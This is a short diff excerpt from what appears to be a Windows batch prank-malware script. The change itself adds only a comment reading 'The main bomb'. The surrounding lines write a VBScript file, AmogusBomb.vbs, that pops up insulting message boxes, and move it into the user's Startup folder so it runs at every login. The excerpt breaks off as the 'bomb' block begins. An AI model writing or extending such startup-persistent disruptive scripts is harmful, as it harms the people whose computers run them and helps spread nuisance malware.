@@ -36,6 +36,7 @@ REM @echo a = MsgBox^("ha ha ha ha ha ha ha",0,"you are an idiot! " ^& Round^(1.
 ) > AmogusBomb.vbs
 move AmogusBomb.vbs "%StartupDir%"
 
+REM The main bomb
 (
 @echo @echo off
 @echo cls
